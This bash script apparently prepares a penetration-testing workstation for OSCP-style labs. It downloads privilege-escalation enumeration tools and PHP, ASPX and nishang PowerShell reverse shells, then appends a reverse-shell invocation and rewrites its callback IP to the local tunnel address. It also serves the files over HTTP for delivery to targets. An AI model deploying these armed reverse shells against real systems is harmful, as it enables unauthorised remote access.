#!/bin/bash

################################################################
# get tunnel ip
################################################################
ip=$(ip addr show tun0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)

################################################################
# pull repository
################################################################
# black-badge
cd ~/black-badge
git pull >/dev/null

# black-badge-private
cd ~/black-badge-private
git pull >/dev/null

#lab
cd ~/lab
git pull >/dev/null


################################################################
# Refresh Enum
################################################################
cd ~
rm -rf -d enum
mkdir enum 2>/dev/null
cd enum

#get LinEnum script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linEnum.sh
chmod +x linEnum.sh

#get linpeas script
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh

#get winpeas script
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat -O winPEAS.bat
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe -O winPEASx64.exe
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe -O winPEASx86.exe

#get Linux suggester:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh

#get Linux Smart Enumeration:
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -O lse.sh
chmod +x lse.sh

#add start python web server script:
echo "sudo python3 -m http.server 6680" > start-pythonwebserver.sh
chmod +x start-pythonwebserver.sh

################################################################
# Refresh Recon
################################################################
cd ~
rm -rf -d recon
cp ~/black-badge/install/oscp/recon . -r

################################################################
# Refresh script
################################################################
cd ~
rm -rf -d script
cp ~/black-badge/install/oscp/script . -r

################################################################
# Refresh Reverse Shell
################################################################
cd ~
rm -rf -d reverse-shell
mkdir reverse-shell 2>/dev/null
cd reverse-shell
cp ~/black-badge/K/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
cp ~/black-badge/K/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1

echo "git clone https://github.com/interference-security/kali-windows-binaries.git 2>/dev/null" > download-kali-windows.sh
chmod +x download-kali-windows.sh

#add start python web server script:
echo "sudo python3 -m http.server 6443" > start-pythonwebserver.sh
chmod +x start-pythonwebserver.sh

#add download nishang script
echo "git clone https://github.com/samratashok/nishang.git 2>/dev/null" > download-nishang.sh
chmod +x download-nishang.sh

################################################################
# Refresh ip
################################################################
#change ip addresses in scripts
sed -i "s/10.10.10.10/$ip/g" ~/script/*

#change ip addresses in reverse shell
sed -i "s/10.10.10.10/$ip/g" ~/reverse-shell/*
sed -i "s/192.168.254.1/$ip/g" ~/reverse-shell/*

################################################################
# add alias to .zshrc
################################################################
if ! grep -q "create-alias.sh" ~/.zshrc; then
    echo "adding aliases"
    echo "source ~/script/create-alias.sh" >> ~/.zshrc
fi

source ~/.zshrc
source ~/script/create-alias.sh

################################################################
# set tmux logging dir
################################################################
FOLDER=~/lab/logging
if [ -d "$FOLDER" ]
then
        echo "loggin seems to exist already.  moving along..."
else
        echo "Adding Tmux logging dir..."
        cd ~/lab
        mkdir logging
fi

#change logging settings in tmux logging plugin
sed -i 's/$HOME/lab\/logging/g' ~/.tmux/plugins/tmux-logging/scripts/variables.sh
sed -i 's/tmux-screen-capture-${filename_suffix}/tmux-sc-${filename_suffix}/g' ~/.tmux/plugins/tmux-logging/scripts/variables.sh
sed -i 's/{session_name}-#{window_index}-#{pane_index}-%Y%m%dT%H%M%S.log/{session_name}-#{window_name}-#{pane_index}-%Y%m%dT%H%M%S.log/g' ~/.tmux/plugins/tmux-logging/scripts/variables.sh

################################################################
# refresh tmux config
################################################################
#copy tmux config
rm -f ~/.tmux.conf
cp ~/black-badge/install/.tmux.conf ~/.tmux.conf





echo "################################################################"
echo "# End"
echo "################################################################"
echo "# "
echo "# Press prefix + I in Tmux to install plugins and reload Tmux config"
echo "# "
echo "# qprint = print alias file"
echo "# qtmux = print tmux information"
echo "# "
echo "################################################################"
